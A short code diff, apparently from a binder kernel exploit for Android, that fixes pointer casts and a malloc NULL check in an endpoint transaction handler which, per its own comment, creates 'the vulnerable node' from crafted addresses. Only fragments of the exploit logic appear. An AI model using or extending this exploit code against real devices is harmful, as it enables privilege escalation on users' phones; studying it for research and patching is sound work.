@@ -29,8 +29,8 @@ static int endpoint_transaction_handler(struct endpoint_handle *handle, struct b
 	switch (tr->code) {
 		case GET_VMA_START:
 			/* Do it in 2 times. */
-			bio_put_uint32(reply, (uint32_t)bs->mapped);
-			bio_put_uint32(reply, (uint32_t)(((uint64_t)(bs->mapped)>>32)));
+			bio_put_uint32(reply, (uint32_t)(uintptr_t)bs->mapped);
+			bio_put_uint32(reply, (uint32_t)(((uint64_t)(uintptr_t)bs->mapped)>>32));
 			res = 0;
 			break;
 		case EXCHANGE_HANDLES:
@@ -40,12 +40,12 @@ static int endpoint_transaction_handler(struct endpoint_handle *handle, struct b
 
 			/* Create the vulnerable node in the process. */
 			bio_put_obj(reply, bs->mapped + 0xe8);
-			uint64_t node2 = bs->mapped + 0xe8;
+			uint64_t node2 = (uint64_t)(uintptr_t)bs->mapped + 0xe8;
 			node2 = node2 & 0xFFFFFFFF;
 			node2 = node2 << 32;
 			node2 += 0x42;
 
-			bio_put_obj(reply, node2);
+			bio_put_obj(reply, (void *)(uintptr_t)node2);
 			res = 0;
 			break;
 		case ADD_PENDING_NODE:
@@ -275,7 +275,7 @@ bool bootstrap_endpoint(const char *endpoint_name)
 
 	/* Allocate handle. */
 	handle = malloc(sizeof(*handle));
-	if (handle == -1) {
+	if (handle == NULL) {
 		log_err("[-] Unable to allocate endpoint handle. Reason: '%s'\n", strerror(errno));
 		return false;
 	}
